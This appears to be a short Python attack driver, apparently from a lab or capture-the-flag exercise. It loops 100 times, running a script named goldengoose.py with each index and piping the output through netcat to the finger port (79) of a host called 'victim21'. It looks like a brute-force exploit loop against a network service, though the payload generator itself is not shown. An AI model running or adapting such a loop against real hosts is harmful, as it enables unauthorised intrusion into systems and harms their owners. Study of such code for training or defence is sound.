import os

for i in range(100):
    bashCommand = "python3 ./goldengoose.py " + str(i) + " | nc victim21 79"
    os.system(bashCommand)